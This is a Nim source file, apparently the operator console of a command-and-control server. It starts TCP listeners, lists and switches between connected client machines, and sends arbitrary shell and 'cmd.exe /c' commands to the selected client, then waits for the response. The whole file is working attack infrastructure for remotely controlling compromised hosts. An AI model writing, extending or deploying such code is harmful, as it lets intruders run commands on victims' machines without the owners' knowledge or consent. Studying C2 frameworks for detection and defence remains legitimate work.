import asyncdispatch, asyncnet, threadpool, asyncfutures
import strutils, terminal

import listeners/[tcp]

import types, logging

proc procStdin*(server: C2Server) {.async.} =
  var handlingClientId: int = -1
  var handlingClient: Client

  prompt(handlingClient, server)
  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():
      
      let input = ^messageFlowVar
      let args = input.split(" ")
      let cmd = args[0]
      let argsn = len(args)

      case cmd:
        of "listeners":
            for tcpListener in server.tcpListeners:
                infoLog $tcpListener
        of "startlistener":
            if argsn >= 2:
                if args[1] == "TCP":
                    if argsn >= 4:
                        asyncCheck server.createNewTcpListener(parseInt(args[3]), args[2])
                    else:
                        echo "Bad usage, correct usage: startlistener TCP (ip) (port)"
            else:
                echo "You need to specify the type of listener you wanna start, supported: TCP"
        of "clients":
            for client in server.clients:
                if client.connected:
                    stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
                else:
                    stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
            infoLog $len(server.clients) & " clients currently connected"
        of "switch":
            for client in server.clients:
                if client.id == parseInt(args[1]):
                    handlingClientId = parseInt(args[1])
                    handlingClient = client
                if handlingClientId != parseInt(args[1]):
                    infoLog "client not found"
        of "info":
            echo @handlingClient
        of "shell":
            if handlingClient.listenerType == "tcp":
                let tcpSocket: TCPSocket = getTcpSocket(handlingClient)
                await tcpSocket.socket.send("CMD:" & args[1..(argsn - 1)].join(" ") & "\r\n")
                if server.clRespFuture[].isNil():
                    server.clRespFuture[] = newFuture[void]()
                await server.clRespFuture[]
        of "cmd":
            if handlingClient.listenerType == "tcp":
                let tcpSocket: TCPSocket = getTcpSocket(handlingClient)
                await tcpSocket.socket.send("CMD:cmd.exe /c " & args[1..(argsn - 1)].join(" ") & "\r\n")
                if server.clRespFuture[].isNil():
                    server.clRespFuture[] = newFuture[void]()
                await server.clRespFuture[]
        of "back": 
            handlingClientId = -1
        of "exit":
            quit(0)

      prompt(handlingClient, server)
      messageFlowVar = spawn stdin.readLine()
      
    await asyncdispatch.sleepAsync(100)